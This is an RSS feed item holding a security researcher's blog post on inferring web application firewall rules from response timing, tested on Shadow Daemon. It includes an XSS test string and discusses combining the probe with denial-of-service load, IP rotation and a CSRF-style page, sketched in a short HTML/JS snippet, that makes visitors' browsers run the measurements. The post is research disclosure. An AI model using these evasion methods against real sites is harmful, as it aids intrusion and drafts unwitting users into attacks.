        </item>
        
        <item>
            <title>Fingerprinting WAF Rules with Timing Based Side Channel Attacks</title>
            <link>https://0xinfection.xyz/posts/fingerprinting-waf-rules-with-timing-based-side-channel-attacks/</link>
            <pubDate>Sun, 18 Aug 2019 00:00:00 +0530</pubDate>
            
            <guid>https://0xinfection.xyz/posts/fingerprinting-waf-rules-with-timing-based-side-channel-attacks/</guid>
            <description>&lt;p&gt;Hi folks,&lt;/p&gt;
&lt;p&gt;Today in this post I am going to be detailing about my recent experiments with web application firewalls (WAFs) focusing on a specific type of side channel attacks, namely, timing. In my opinion, this field hasn’t been studied actively and the results can be more lethal than you’re expecting. This post is already long, so lets get started rightaway. :)&lt;/p&gt;
&lt;h2 id=&#34;side-channel-attacks&#34;&gt;Side Channel Attacks?&lt;/h2&gt;
&lt;p&gt;Wikipedia defines side-channel attacks as:&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Hi folks,</p>
<p>Today in this post I am going to be detailing about my recent experiments with web application firewalls (WAFs) focusing on a specific type of side channel attacks, namely, timing. In my opinion, this field hasn’t been studied actively and the results can be more lethal than you’re expecting. This post is already long, so lets get started rightaway. :)</p>
<h2 id="side-channel-attacks">Side Channel Attacks?</h2>
<p>Wikipedia defines side-channel attacks as:</p>
<blockquote>
<p>An attack based on information gained from the implementation of a computer system, rather than weaknesses in the implemented algorithm itself.</p></blockquote>
<p>So basically we are extracting/learning sensitive info which shouldn’t be known to the public using side channel attacks. This is achieved usually due some faulty business logic implementations which are vulnerable to this kind of enumeration attack.</p>
<p>The attack we are going to talk about today is based on the clock. A timing attack focuses on the data movement in and out of the CPU/memory on the hardware running the system or algorithm. Simply by observing time-variations on how long the CPU is taking to analyse data being fed into it, one can enumerate internal sensitive information from the system.</p>
<h2 id="web-application-firewalls">Web Application Firewalls</h2>
<p>Well as you know, web application firewalls are used to detect and block attacks against vulnerable web applications. Besides blocking rogue inbound requests, WAFs are often used to “cloak” those outgoing responses that contain sensitive information such as error messages or stack traces. WAFs usually distinguish between a normal and rogue request via a set of regular expressions called filter rules.</p>
<h3 id="why-fingerprint-em-rules">Why Fingerprint ’em Rules?</h3>
<p>Our target here is to find loopholes within the ruleset of the WAF. So basically by fingerprinting the rules of a WAF, one is actually able to detect what kind of filter strategies are being actively used and the attack methodology can be adapted in a way such that it evades the WAF. Once a specific bypass for the WAF has been crafted, the attacker can further exploit existing vulnerabilities within the web application.</p>
<p>Here in this article I have used a common method of rule fingerprinting known as regex-reversing which typically relies on examining every single component of a request to understand which part of the request is causing the block.</p>
<h2 id="understanding-the-setup">Understanding The Setup</h2>
<p>Typically, a WAF is deployed in the following 4 network topologies:</p>
<ul>
<li><strong>Reverse Proxy</strong>: The WAF literally sits between the client and the server, intercepting requests. The client connects directly to the WAF and then the WAF passes the query (if normal) to the server. In case of a blocked request, the query never reaches the server.</li>
<li><strong>Server-Resident</strong>: This is the setup when a WAF is typically installed on the server it is protecting. This can be further categorized into 2 topologies, the first being that the WAF is installed as a plugin, while the second one is when the WAF is installed as a programming library.</li>
<li><strong>Out-of-Band</strong>: In this case, the WAF usually gets a copy of the traffic via a monitoring port on a network device. This mode of implementation limits the WAF’s ability to block a request and can only send TCP-reset packets to interrupt traffic whenever a malicious query is detected.</li>
<li><strong>Cloud-Deployment</strong>: This setup comprises of the WAF functioning within the network cloud of the provider. The working is similar to reverse proxy setup, with the exception that every single request to the server has to pass through the network cloud.</li>
</ul>
<p>In my experiments, I took up two most commonly used implementations of a WAF, namely, the reverse-proxy and the plugin-based server resident setup.</p>
<h2 id="conventional-methods-of-waf-fingerprinting">Conventional Methods of WAF Fingerprinting</h2>
<p>Typically, any WAF is identified via unique headers, cookies, blocked responses like status code, response phrase/reason and the page content. There are many brilliant WAF fingerprinting/bypassing tools, eg. WAFW00F, WAFNinja, etc. They usually exploit storage side channels to fingerprint rules within a WAF (whether a request has been blocked or accepted) and further bypass them. All these tools can possibly observe are:</p>
<ul>
<li><strong>WAF Block Message</strong>: Signifying that the WAF has flagged and blocked the request as malicious. Usually the blocked response page or a header defines that the request has been blocked. Sometimes the response status code (403 Forbidden) indicates a blocked request too.</li>
</ul>

    <img src="blocks.png"  alt="Partial Block"  class="center"  />


<ul>
<li><strong>Web-App Error Message</strong>: Signifying that the web-app bugged out upon the request. However the error message gets cloaked by the custom block page of the WAF. In this case, the WAF did not block the request, but only cloaked the error message of the web application to prevent sensitive information disclosure via stack traces, etc.</li>
</ul>

    <img src="partial-waf-cover.png"  alt="Partial Block"  class="center"  />


<ul>
<li><strong>Normal Response</strong>: Signifying that the request has clearly passed through the WAF to the web server. However, there remains a possibility that the WAF intercepted the request and removed the malicious part of the request before passing it onto the server.</li>
</ul>
<h2 id="the-main-drawback">The Main Drawback</h2>
<p>So as you may have just noticed, that just from observing only responses, one cannot explicitly distinguish between a passed and a blocked request (pts. 1 and 2), owing to the fact that WAF block pages can be observed in both cases of rejected requests as well as internal web-app error messages (which get cloaked by the WAF).</p>
<h3 id="why-timing-attacks">Why Timing Attacks?</h3>
<p>The solution to the above-mentioned drawback would be this new methodology based on timing attacks. By making use of timing attacks, one can tell if a request results in a certain response, i.e. gets blocked or is passed; for web-app error messages, it is simply ignored due to the response timing being far greater to those of passed requests. My experiment result statistics state that we can precisely fingerprint blocked and passed requests with an accuracy over 95%.</p>
<h2 id="idea-of-the-attack">Idea of the Attack</h2>
<h3 id="principle">Principle</h3>
<p>The main principle being this attack technique is the fact that a blocked malicious request takes less time (in order of milliseconds) for a response than a passed normal request. The rejected requests finish earlier than a passed request because the discarded ones are never processed by the server. Thus, the timing difference between a blocked request and a passed request equals the processing time of the application logic.</p>
<blockquote>
<p><em><strong>Assumption</strong>: The only assumption here is that our WAF blocks a request and returns an error message immediately upon detecting a malicious request. Other WAF variants which strip the malicious parts of a request and forward the sanitized request to the server are not being taken into account.</em></p></blockquote>
<h3 id="the-approach">The Approach</h3>
<p>So to distinguish between a blocked and a passed request we’ll need two different types of requests, a normal clean request which will, without any trouble get passed through the WAF. The second type is the malicious kind containing a payload string like <code>&lt;script&gt;alert()&lt;/script&gt;</code> which will get detected easily.</p>

    <img src="methodology.png"  alt="Methodology"  class="center"  />


<p>Our approach to this problem initially would be to first split the attack into two phases :-</p>
<ol>
<li><strong>Learning Phase</strong>: In this phase we measure and learn what could be the possible response time for a blocked and a passed request for further reference in our attack phase.</li>
<li><strong>Attack Phase</strong>: In this phase we perform the actual tests, i.e. the rogue requests are being sent for the final results and further statistical analysis.</li>
</ol>
<p>Now, comes the computation methodology. In the learning phase, first off, we measure the response times <em>〈Tₙ = t₁, t₂, … tₙ 〉</em> of n blocked requests and define a “flagging threshold”. This flagging threshold will serve as a future reference when it comes to determining whether a request passed or got blocked. It can be represented as:</p>

    <img src="approach1.png"  alt="Approach 1"  class="center"  />


<p>Similarly we define a “passing threshold” by taking n passed requests where the boundary can be defined by taking the minimum value of all the response times of requests which got past the WAF undetected. This threshold can be represented as:</p>

    <img src="approach2.png"  alt="Approach 2"  class="center"  />


<p>where in both cases <em>δ</em> signifies that, the actual passing/blocking boundaries can be slightly less than that of the measured values due to possible network latency or noise.</p>
<p>So now theoretically, our flagging and passing boundaries’ timings should serve as a threshold for blocked and passed requests, while practically this is not replicable due to the obvious noise in the network. Thus we take up the mean of both blocking and passing boundaries to get an absolute boundary which can give the actual threshold value about the response time for a blocked as well as a passed request.</p>

    <img src="approach3.png"  alt="Approach 3"  class="center"  />


<p>Clearly, any timing measurement for a request with <em>t ≥ tᵦ</em> is a passed request while <em>t &lt; tᵦ</em> is a blocked request. However, any request with response time near to the boundary <em>tᵦ</em> may denote a passed request with low noise or a blocked request with high noise. To rule this out, the attacker needs to amplify this attack vector. We&rsquo;ll discuss more about this, read on.</p>
<h2 id="performing-the-experiment">Performing the Experiment</h2>
<h3 id="the-setup">The Setup</h3>
<p>To replicate the above theory, I took up two most commonly implemented topologies of WAF setups, i.e. a reverse-proxy based and a server-resident (plugin type) based topology. I hosted the setups on my own server and replicated them exactly the way they would be implemented in real life. To test the approach I chose <a href="https://github.com/zecure/shadowd">Shadow Daemon</a>, owing to its open-source, low rules maintenance nature. Also, it is pretty much easy to setup, so porting the code to work as a plugin was not too difficult.</p>
<h3 id="the-learning-phase">The Learning Phase</h3>
<p>I wrote up a small python script which starts with the learning phase by repetitively sending normal and malicious requests one after another with a time delay of 2 seconds between each request. A total of 200 requests were used among which a hundred consisted of normal requests while the other half contained malicious strings within them. The learning phase yielded an absolutely clear picture of how effective is this method.</p>

    <img src="learning-phase.png"  alt="Learning Phase"  class="center"  />


<p>Some examples of passed and blocked/rejected requests are:</p>

    <img src="initcomparison.png"  alt="Comparison"  class="center"  />


<p>You may notice that some of the requests in cases of blocked requests crossed the flagging boundary. This is probably due to the internet connection suffering packet losses or network congestion. However, it can be noted clearly that there is no request crossing the absolute boundary on either side.</p>
<h3 id="the-attack-phase">The Attack Phase</h3>
<p>Time for the actual test. In this phase, a set of most common malicious payloads are collected for testing against the target. Now the idea here is to generate sequences of polymorphic payloads by gradually adding different obfuscation cases to the query strings for various contexts. Polymorphic payloads work exactly the same way as malicious payloads (semantically identical) but are syntactically different/obfuscated so that the firewall regex cannot detect it. We will discuss more on this topic in another article but for now lets just keep to a small example:</p>

    <img src="comparison.png"  alt="Comparison"  class="center"  />


<p>Now a series of such requests are sent over to the the server hosting the WAF, and the response times are recorded. To further validate the claims of the experiment, both response status codes as well as the block-pages are recorded. A correctly identified malicious request would result in a 403 status along with the blockpage as response content.</p>
<p>On the reverse-proxy setup, the results were pretty much as expected. There was a minimum time gap of 53.2 ms between a flagged and passed request. The results indicate that in 96.4% of cases, we are able to correctly distinguish between a blocked and a passed request. Thus, we can safely say that the accuracy and reliability of our method for this topology is high enough to assert that any attacker can reach perfect measurement conditions with only a few repetitions.</p>

    <img src="attack-phase.png"  alt="Attack Phase"  class="center"  />


<p>In the case of the server resident setup (plugin based), I actually did not expect the results to have such distinctive result, however I was surprised to see that the method works quite well as it does in case of reverse-proxy topology. Something worthwhile I noticed in this setup is that the overall timing difference between a blocked and a passed request (58.8 ms) turned out to be greater than the previous topology (53.2 ms). The results obtained for this topology are visualized are as below:</p>

    <img src="attack-phase-2.png"  alt="Comparison"  class="center"  />


<p>Thus we can safely say that our timing attack clearly distinguished blocked and passed requests in 95%+ of cases. A short summary of my experiment is as below:</p>

    <img src="final-comparison.png"  alt="Comparison"  class="center"  />


<h2 id="downsides-of-the-method">Downsides of the Method</h2>
<p>The main drawback of this method is that any attacker needs to send a large amount of requests to find loopholes within a WAF rule-set. On top of this, we have the network noise/jitter issue as a big obstacle causing the measurements to falter. Another factor we can add to this list is the server load, which can both be additive or multiplicative depending upon the nature how the server handles the requests. Modern well-furnished WAFs often implement a security mechanism where the IP of the client gets blocked infinitely/for a limited time whenever the WAF detects a malicious string within a request. This limits the ability of this method greatly. We can. however we can get around this with another technique.</p>
<h3 id="dealing-with-it">Dealing with It</h3>
<p>The obvious solution to this kind of problem is to perform more and more tests distributed over a reasonable time until we obtain an average result, which rules out the remaining queries with large response times. Also since network noise is strictly non-negative, this does actually work owing to the nature of our attack vector, i.e. testing for Boolean values. In cases of WAFs blocking the IP address of the client, IP rotation attacks as well as cross site timing attacks are highly effective to bypass the ugly scenario of getting an IP blocked. In many cases, putting a time delay between consecutive requests also helps.</p>
<h3 id="amplifying-the-attack">Amplifying the Attack</h3>
<p>So how can we amplify this attack vector? Lets see:</p>
<p><strong>1. Choosing a Longer URL Path</strong></p>
<p>When a resource is queried from a server, it is processed by the server CPU, different components are accumulated together (eg. images, CSS, etc) and then served to us via response. Thus we can choose a URL path whose response content is the lengthiest among all other URL paths (eg. for a blog site, we can choose articles with the maximum number of images), causing more load on the server CPU. More the time taken by the server to process a request, more the effectiveness of the attack.</p>
<p><strong>2. Denial of Service Attacks</strong></p>
<p>Secondly, we can combine the process with various denial of service attacks like submitting search boxes with large queries, sending POST requests with large content, hash collisions attacks (HashDoS), etc. The longer the fingerprinting takes, the lesser is the effect of noise on the measurements.</p>
<p><strong>3. Cross Site Rule Fingerprinting</strong></p>
<p>Finally, we can chain our fingerprinting process with cross-site request forgery (CSRF) attacks which would require an attacker to lure users to a site where he can embed some HTML and JavaScript to do the measurements for the user and record the results for him. An example of such arrangement is as below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display: none&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">test</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#960050;background-color:#1e0010">’</span><span style="color:#a6e22e">test</span><span style="color:#960050;background-color:#1e0010">’</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">start</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Date();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">test</span>.<span style="color:#a6e22e">onerror</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">end</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Date();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Total time: &#34;</span> <span style="color:#f92672">+</span> (<span style="color:#a6e22e">end</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">start</span>));
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">test</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://sitename.tld/path?&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">parameter</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">payload</span>;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>In the code shown above, we create an invisible <code>img</code> tag. Just before we duplicate the payload to the URI of the image, we start recording the time. Since the image is invalid, the browser will fire an <code>onerror</code> event handler and the relative function will be executed when the time recording stops and an alert box with the recorded time will be popped up.</p>
<p>There are three main advantages to this method:</p>
<ul>
<li>First, the attackers identity remains concealed. Since multiple users will be sending requests to the server with the WAF, it is virtually impossible to distinguish who is the actual actor behind this.</li>
<li>This method absolutely overrules the impact of WAFs blocking IP addresses as a counter security measure.</li>
<li>Also, it is notably important to state that this method works reliably only with timing based attacks. Sometimes SOP (Same Origin Policy) might restrict reading page content from other origins. So, in such situations, one may not be able to observe the blockpage and fingerprint the WAF using storage side channels.</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>So here we conclude. This attack vector highlights the effectiveness of timing based side channel attacks on the web and also the importance of WAF developers writing bullet-proof ruleset. In this small endeavor of mine, I discovered several bypasses and loopholes within the ShadowD WAF ruleset, and in my next article, I might be writing about the bypasses I found.</p>
<p>So far, thanks for reading. Cheers! 🥂</p>
]]></content>
        </item>
        
    </channel>
</rss>
